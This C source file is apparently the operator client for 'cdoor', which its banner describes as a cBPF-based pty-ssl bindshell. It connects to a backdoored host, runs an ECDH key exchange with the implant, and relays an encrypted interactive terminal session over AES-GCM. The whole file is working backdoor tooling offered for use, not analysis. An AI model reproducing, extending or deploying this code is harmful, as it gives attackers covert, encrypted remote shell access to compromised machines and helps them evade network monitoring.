#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>
#include <stdint.h>

#include <openssl/conf.h>
#include <openssl/err.h>
#include <openssl/ec.h>
#include <openssl/ecdh.h>
#include <openssl/evp.h>
#include <openssl/rand.h>


#define BUFFERSIZE 65536 * 8  //crash at sudo ps aux and netstat,valgrind test
#define PUBKEY_LEN 66

#ifndef uchar
#define uchar unsigned char
#endif

int cli_send = 0;
int cli_recv = 0;

//gcc -O0 -ggdb -fno-pie -no-pie clitest.c -o clitest -lutil -lcrypto

//encryption starts

void handleErrors()
{
    ERR_print_errors_fp(stderr);
    abort();
}

EC_KEY * create_new_private_key()
{
	EC_KEY * prikey;
	if (NULL == (prikey = EC_KEY_new_by_curve_name(NID_X9_62_prime256v1)))
        handleErrors();

	if (1 != EC_KEY_generate_key(prikey))
        handleErrors();

	return prikey;
}

uchar * compute_secret(	EC_KEY *key, 
                    const EC_POINT *peer_pub_key,
					size_t *secret_len)
{
	int field_size;
	uchar * secret;

	field_size = EC_GROUP_get_degree(EC_KEY_get0_group(key));
	*secret_len = (field_size + 7) / 8;

	if (NULL == (secret = OPENSSL_malloc(*secret_len))) 
        handleErrors();

	*secret_len = ECDH_compute_key(secret, *secret_len,
					peer_pub_key, key, NULL);

	if (*secret_len <= 0) {
		OPENSSL_free(secret);
        secret = NULL;
		return NULL;
	}
	return secret;
}



void ecdh_genkey(int sockfd, uchar *out_key){

    EC_KEY * local_prikey = create_new_private_key();

    const EC_POINT * local_pubkey = EC_KEY_get0_public_key(local_prikey);

    const EC_GROUP * ec_group_local;
    if(NULL == (ec_group_local = EC_KEY_get0_group(local_prikey)))
        handleErrors();
    
    char *local_pubkey_char = (char *)(OPENSSL_malloc(PUBKEY_LEN));
    local_pubkey_char = EC_POINT_point2hex(ec_group_local, local_pubkey, POINT_CONVERSION_COMPRESSED, NULL);

    //client
    char recved_remote_pubkey[PUBKEY_LEN];  
    //printf("sockfd:%d\n", sockfd); 
    while(1){
        ssize_t recvlen = recv(sockfd, recved_remote_pubkey, PUBKEY_LEN, 0);// get server(backdoor's) pubkey
        if((int)recvlen == PUBKEY_LEN) break;
    }
    puts("[+]\x1B[33m Recving remote public key:\n\x1B[0m"); 
    BIO_dump_fp (stdout, recved_remote_pubkey, PUBKEY_LEN);

    send(sockfd, local_pubkey_char, PUBKEY_LEN, 0); // send local local pubkey to door
    puts("[+]\x1B[33m Sending local public key:\n\x1B[0m"); 
    BIO_dump_fp (stdout, local_pubkey_char, PUBKEY_LEN);

    EC_POINT *fmted_remote_pubkey = EC_POINT_new(ec_group_local);
    if(NULL == EC_POINT_hex2point(ec_group_local, recved_remote_pubkey, fmted_remote_pubkey, NULL))
        handleErrors();
    
    size_t local_secret_len;  //secret will be aes key
	uchar *local_secret = (uchar *)(OPENSSL_malloc(32)); 
    local_secret = compute_secret(local_prikey, fmted_remote_pubkey, &local_secret_len); 

    memset(local_pubkey_char, 0, PUBKEY_LEN);
    OPENSSL_free(local_pubkey_char);
    local_pubkey_char = NULL;

    memset(recved_remote_pubkey, 0, PUBKEY_LEN);

    EC_KEY_free(local_prikey);
    local_prikey = NULL;

    memcpy(out_key, local_secret, 32);

    memset(local_secret, 0, 32);
    OPENSSL_free(local_secret);
    local_secret = NULL;
    
}



int gcm_encrypt(unsigned char *plaintext, int plaintext_len,
                unsigned char *aad, int aad_len,
                unsigned char *key,
                unsigned char *iv, int iv_len,
                unsigned char *ciphertext,
                unsigned char *tag)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;


    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();


    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
        handleErrors();


    if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL))
        handleErrors();


    if(1 != EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv))
        handleErrors();


    if(1 != EVP_EncryptUpdate(ctx, NULL, &len, aad, aad_len))
        handleErrors();


    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;


    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;


    if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag))
        handleErrors();

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}


int gcm_decrypt(unsigned char *ciphertext, int ciphertext_len,
                unsigned char *aad, int aad_len,
                unsigned char *tag,
                unsigned char *key,
                unsigned char *iv, int iv_len,
                unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;
    int ret;

    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();


    if(!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
        handleErrors();


    if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv_len, NULL))
        handleErrors();


    if(!EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv))
        handleErrors();


    if(!EVP_DecryptUpdate(ctx, NULL, &len, aad, aad_len))
        handleErrors();


    if(!EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;


    if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag))
        handleErrors();


    ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);


    EVP_CIPHER_CTX_free(ctx);

    if(ret > 0) {
        plaintext_len += len;
        return plaintext_len;
    } else {
        return -1;
    }
}


void unified_encrypt(void *buf, int len, 
            uchar *key,
            uchar *iv,
            uchar *aad,
            uchar *tag,
            uchar *out_buf){

    uchar *sumbuf = (uchar *)(OPENSSL_malloc(16+4+16+4+len));

    uchar *ciphertext = (uchar *)(OPENSSL_malloc(len));

    int ciphertext_len = gcm_encrypt((uchar *)(buf), len, aad, 4, key, iv, 16, ciphertext, tag);
    
    uchar ci_len[4];
    unsigned int tmp_num = htonl((unsigned int)ciphertext_len);
    memcpy(ci_len, &tmp_num, 4);
    
    memcpy(sumbuf, iv, 16);
    memcpy(sumbuf+16, ci_len, 4);
    memcpy(sumbuf+16+4, tag, 16);
    memcpy(sumbuf+16+4+16, aad, 4);
    memcpy(sumbuf+16+4+16+4, ciphertext, ciphertext_len);

    memcpy(out_buf, sumbuf, 16+4+16+4+ciphertext_len);

    OPENSSL_free(ciphertext);
    ciphertext = NULL;

    OPENSSL_free(sumbuf);
    sumbuf = NULL;

}

void unified_decrypt(void *buf, int len, uchar *out_buf, uchar *key){

    uchar iv[16];
    memcpy(iv, buf, 16);

    unsigned int tmp_num = 0;
    memcpy(&tmp_num, buf+16, 4);
    unsigned int ciphertext_len = ntohl(tmp_num);
    if(ciphertext_len > BUFFERSIZE) ciphertext_len = BUFFERSIZE-16-4-16-4-2;
    //printf("[[%u]]",ciphertext_len);//max malloc memory size exceeded here
    //try to get available memory at runtime to avoid crash

    uchar tag[16];
    memcpy(tag, buf+16+4, 16);

    uchar aad[4];
    unsigned int tmp = 0;
    memcpy(aad, buf+16+4+16, 4);
    memcpy(&tmp, aad, 4);
    int srv_send = (int)(ntohl(tmp));
    //printf("srv_send:%d\ncli_recv:%d\n", srv_send, cli_recv);
    /*if(srv_send != cli_recv){
        puts("[!]\x1B[31m packet sequence verify failure.\n\x1B[0m");
        exit(1);
    }*/

    uchar *ciphertext = (uchar *)(OPENSSL_malloc(ciphertext_len));
    memcpy(ciphertext, buf+16+4+16+4, ciphertext_len);
    uchar *plaintext = (uchar *)(OPENSSL_malloc(ciphertext_len));

    int plaintext_len = gcm_decrypt(ciphertext, ciphertext_len,
                                    aad, 4, tag, key, iv, 16, plaintext);
    if(plaintext_len < 0){
        puts("[!]\x1B[31m decrypt verify failed.\n\x1B[0m");
        abort();
    }

    memcpy(out_buf, plaintext, plaintext_len);

    OPENSSL_free(ciphertext);
    ciphertext = NULL;

    OPENSSL_free(plaintext);
    plaintext = NULL;

}


//encryption ends

struct termios saved_attributes;
void reset_input_mode()
{
    tcsetattr(STDIN_FILENO, TCSANOW, &saved_attributes);
}

void sigint_handler(int signum)
{
    printf("\n\x1B[1;36m[+]Caught signal: %d\n\x1B[0m", signum);
    exit(signum);
}

void print_addrinfo(struct addrinfo *input)
{
    int addr_i = 0;
    for(struct addrinfo *p = input; p != NULL; p = p->ai_next)
    {
        char *ipver;
        void *addr;

        if (p->ai_family == AF_INET)
        {
            ipver = "IPv4";
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
            addr = &(ipv4->sin_addr);
        }
        else
        {
            ipver = "IPv6";
            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;
            addr = &(ipv6->sin6_addr);
        }

        char ipstr[INET6_ADDRSTRLEN];
        inet_ntop(p->ai_family, addr, ipstr, sizeof(ipstr)); 
        printf("\n[+] Found:%2d. %s: %s\n\n", ++addr_i, ipver, ipstr);
    }
}

int main(int argc, char **argv)
{   
    system("clear");
    printf(
"\n\e[1;34m\a"
" .d8888b.  8888888b.   .d88888b.   .d88888b.  8888888b.  \n"
"d88P   88b 888    88b d88     88b d88     88b 888    88b \n"
"\e[1;35m\a888    888 888    888 888     888 888     888 888    888 \n"
"888        888    888 888     888 888     888 888   d88P \n"
"888        888    888 888     888 888     888 8888888P   \n"
"\e[1;36m\a888    888 888    888 888     888 888     888 888 T88b   \n"
"Y88b  d88P 888  .d88P Y88b. .d88P Y88b. .d88P 888  T88b  \n"
"  Y8888P   8888888P     Y88888P     Y88888P   888   T88b \n"
"\n\x1B[0m"
"[ cdoor ] - A cBPF-based pty-ssl bindshell.\n"
"[ + ]Usage: %s <hostname> <port>\n\n\n", argv[0]
    );

        
    if(argc != 3)
    {
        fprintf(stderr,"\x1B[33m[!] Usage: %s <hostname> <port>\n\x1B[0m", argv[0]);
        return 1;
    }

    signal(SIGINT, sigint_handler);

    printf("\n\x1B[33m[...] Looking up addresses for %s ...\n\x1B[0m", argv[1]);

    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC; 
    hints.ai_socktype = SOCK_STREAM;

    struct addrinfo *dnsres;
    int status = getaddrinfo(argv[1], argv[2], &hints, &dnsres); 
    if(status != 0)
    {
        fprintf(stderr, "[!] dns lookup failed: %s\n", gai_strerror(status));
        return 2;
    }

    print_addrinfo(dnsres);

    printf("\n\x1B[33m[...] Connecting server ...\n\x1B[0m");
    int sockfd = socket(dnsres->ai_family, dnsres->ai_socktype, dnsres->ai_protocol);

    if(connect(sockfd, dnsres->ai_addr, dnsres->ai_addrlen) != 0)
    {
        perror("[!]Connect to socket");
        return 3;
    }
    printf("\n\x1B[1;32m[+] Connected to socket.\n\n\x1B[0m");

    freeaddrinfo(dnsres); 

    char buf[BUFFERSIZE + 1];
    unsigned int nbytes, mbytes;
    

    memset(buf, 0, BUFFERSIZE + 1);


    if (!isatty(STDIN_FILENO))
    {
        fprintf (stderr, "[!]Current server stdin is Not inside a terminal.\n");
        exit (EXIT_FAILURE);
    }


    tcgetattr(STDIN_FILENO, &saved_attributes);
    atexit(reset_input_mode);

    struct termios tattr;
    tcgetattr(STDIN_FILENO, &tattr);
    tattr.c_lflag &= ~(ICANON | ECHO); 
    tattr.c_cc[VMIN] = 1;
    tattr.c_cc[VTIME] = 0;
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &tattr);


    fd_set master, readfds;
    FD_ZERO(&master);
    FD_SET(STDIN_FILENO, &master);
    FD_SET(sockfd, &master);

    uchar key[32];
    ecdh_genkey(sockfd, key);
    puts("\n\x1B[1;32m[+] Key calculated:\n\x1B[0m");
    BIO_dump_fp (stdout, key, 32);
    puts("\n\x1B[1;35m[+] Establishing connection...\n\n\x1B[0m");


    for(;;)
    {
        readfds = master;

        if(select(sockfd + 1, &readfds, NULL, NULL, NULL) == -1)
        {
            perror("[!]Selecting sockfd");
            return 7;
        }

        if(FD_ISSET(STDIN_FILENO, &readfds))
        {
            nbytes = read(STDIN_FILENO, buf, BUFFERSIZE);
            if(nbytes < 1)
            {
                perror("[!]Stdin closed");
                break;
            }


            uchar iv[16]; // generate iv
            if (!RAND_bytes(iv, 16))
                handleErrors();

            uchar tag[16];  //prepare gmac tag

            uchar aad[4];  //serialize aad(int)
            unsigned int tmp_num = htonl((unsigned int)cli_send);
            memcpy(aad, &tmp_num, 4);

            uchar *sumbuf = (uchar *)(OPENSSL_malloc(16+4+16+4+nbytes));
            unified_encrypt(buf, nbytes, key, iv, aad, tag, sumbuf);

            mbytes = send(sockfd, sumbuf, 16+4+16+4+nbytes, 0);
            cli_send = cli_send + 1;

            memset(sumbuf, 0, 16+4+16+4+nbytes);
            OPENSSL_free(sumbuf);
            sumbuf = NULL;

            memset(buf, 0, BUFFERSIZE + 1); 
        }

        if(FD_ISSET(sockfd, &readfds))
        {
            //fflush(STDOUT_FILENO);
            nbytes = recv(sockfd, buf, BUFFERSIZE, 0);
            if(nbytes < 1)
            {
                perror("[!]Socket closing");
                break;
            }

            uchar *plaintext = (uchar *)(OPENSSL_malloc(nbytes-16-4-16-4));
            unified_decrypt(buf, nbytes, plaintext, key);
            cli_recv = cli_recv + 1;

            mbytes = write(STDOUT_FILENO, plaintext, nbytes-16-4-16-4);

            memset(plaintext, 0, nbytes-16-4-16-4);
            OPENSSL_free(plaintext);
            plaintext = NULL;

            memset(buf, 0, BUFFERSIZE + 1);

        }
    }

    close(sockfd);
    return 0;
}





